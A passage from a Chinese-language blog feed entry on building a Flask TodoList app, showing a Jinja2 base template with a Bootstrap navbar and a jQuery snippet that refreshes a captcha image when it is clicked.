punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>js/jquery.min.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>js/popper.min.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>js/bootstrap.min.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   {% block js %}>   >      {% endblock %}   {% block css %}>   >      {% endblock %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-dark bg-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>main.index<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-right</span><span class="token punctuation">:</span> <span class="token number">6</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>31<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>31<span class="token punctuation">"</span></span> <span class="token attr-name">viewBox</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0 0 16 16<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi bi-card-checklist<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>currentColor<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">fill-rule</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>evenodd<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M14.5 3h-13a.5.5 0 0 0-.5.5v9a.5.5 0 0 0 .5.5h13a.5.5 0 0 0 .5-.5v-9a.5.5 0 0 0-.5-.5zm-13-1A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h13a1.5 1.5 0 0 0 1.5-1.5v-9A1.5 1.5 0 0 0 14.5 2h-13z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">fill-rule</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>evenodd<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M7 5.5a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5zm-1.496-.854a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0l-.5-.5a.5.5 0 1 1 .708-.708l.146.147 1.146-1.147a.5.5 0 0 1 .708 0zM7 9.5a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5zm-1.496-.854a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0l-.5-.5a.5.5 0 0 1 .708-.708l.146.147 1.146-1.147a.5.5 0 0 1 .708 0z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>TodoList       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#navbarColor01<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarColor01<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Toggle navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarColor01<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-nav mr-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               {{ render_nav_item('main.index', '首页', use_li=True) }}           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               {% if not current_user.is_authenticated %}>                      {{ render_nav_item('auth.auth_login', '登录', use_li=True ) }}>                      {{ render_nav_item('auth.auth_register', '注册', use_li=True) }}>                  {% else %}>                       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav-link btn btn-outline-primary<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25<span class="token punctuation">"</span></span> <span class="token attr-name">viewbox</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0 0 16 16<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi bi-bell<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>currentColor<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>>                                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">fill-rule</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>evenodd<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M8 1.918l-.797.161A4.002 4.002 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4.002 4.002 0 0 0-3.203-3.92L8 1.917zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5.002 5.002 0 0 1 13 6c0 .88.32 4.2 1.22 6z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>>                      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav-item dropdown<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav-link dropdown-toggle btn btn-outline-primary<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">aria-haspopup</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25<span class="token punctuation">"</span></span> <span class="token attr-name">viewbox</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0 0 16 16<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi bi-gear<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>currentColor<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">fill-rule</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>evenodd<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M8.837 1.626c-.246-.835-1.428-.835-1.674 0l-.094.319A1.873 1.873 0 0 1 4.377 3.06l-.292-.16c-.764-.415-1.6.42-1.184 1.185l.159.292a1.873 1.873 0 0 1-1.115 2.692l-.319.094c-.835.246-.835 1.428 0 1.674l.319.094a1.873 1.873 0 0 1 1.115 2.693l-.16.291c-.415.764.42 1.6 1.185 1.184l.292-.159a1.873 1.873 0 0 1 2.692 1.116l.094.318c.246.835 1.428.835 1.674 0l.094-.319a1.873 1.873 0 0 1 2.693-1.115l.291.16c.764.415 1.6-.42 1.184-1.185l-.159-.291a1.873 1.873 0 0 1 1.116-2.693l.318-.094c.835-.246.835-1.428 0-1.674l-.319-.094a1.873 1.873 0 0 1-1.115-2.692l.16-.292c.415-.764-.42-1.6-1.185-1.184l-.291.159A1.873 1.873 0 0 1 8.93 1.945l-.094-.319zm-2.633-.283c.527-1.79 3.065-1.79 3.592 0l.094.319a.873.873 0 0 0 1.255.52l.292-.16c1.64-.892 3.434.901 2.54 2.541l-.159.292a.873.873 0 0 0 .52 1.255l.319.094c1.79.527 1.79 3.065 0 3.592l-.319.094a.873.873 0 0 0-.52 1.255l.16.292c.893 1.64-.902 3.434-2.541 2.54l-.292-.159a.873.873 0 0 0-1.255.52l-.094.319c-.527 1.79-3.065 1.79-3.592 0l-.094-.319a.873.873 0 0 0-1.255-.52l-.292.16c-1.64.893-3.433-.902-2.54-2.541l.159-.292a.873.873 0 0 0-.52-1.255l-.319-.094c-1.79-.527-1.79-3.065 0-3.592l.319-.094a.873.873 0 0 0 .52-1.255l-.16-.292c-.892-1.64.902-3.433 2.541-2.54l.292.159a.873.873 0 0 0 1.255-.52l.094-.319z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>>                                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span> <span class="token attr-name">fill-rule</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>evenodd<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>M8 5.754a2.246 2.246 0 1 0 0 4.492 2.246 2.246 0 0 0 0-4.492zM4.754 8a3.246 3.246 0 1 1 6.492 0 3.246 3.246 0 0 1-6.492 0z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-menu dropdown-menu-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{# 下拉菜单右对齐 #}>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-item<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_detail<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{ current_user.username }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-divider<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-item<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token punctuation">></span></span>个人中心<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-divider<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>                              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dropdown-item<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>auth.auth_logout<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登出系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>                      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  {% endif %}           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">55</span>px<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span>auto</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       {% block content %}>          {% endblock %}   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin</span><span class="token punctuation">:</span><span class="token number">20</span>px <span class="token number">0</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           {% block footer %}>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span> <span class="token entity" title="&copy;">&amp;copy;</span> 2020–<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://wenyan.online<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noopener<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Written by Wen Yan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Wen Yan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span>>              {% endblock %}       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>dropdown-menu-right</code> 可以使下拉菜单右对齐.</li></ul></blockquote><h5 id="5-点击更换验证码"><a href="#5-点击更换验证码" class="headerlink" title="5.点击更换验证码"></a>5.点击更换验证码</h5><blockquote><p>补存上述<code>login\register</code>验证码,提供点击更换验证码.</p><ul><li><p>创建<code>base.js</code></p></li><li><p>形如<code>http://kwenyan.online:8080/commons/graph_captcha/?ddddd</code>都能访问到我们的图片,根据这个特性,使用<code>jquery</code>点击图片切换<code>URL</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!---login/register 都需要添加一个id属性----></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>commons.graph_captcha<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">35%</span><span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">4</span>px auto<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ver_code<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#ver_code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">"/commons/graph_captcha/"</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>加载</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% block js %}>       <script src="{{ url_for('static', filename=" js base.js") }}">>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></blockquote></script></code></pre></li></ul></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:使用条件进行线程同步</title>
      <link href="/posts/11161.html"/>
      <url>/posts/11161.html</url>
      
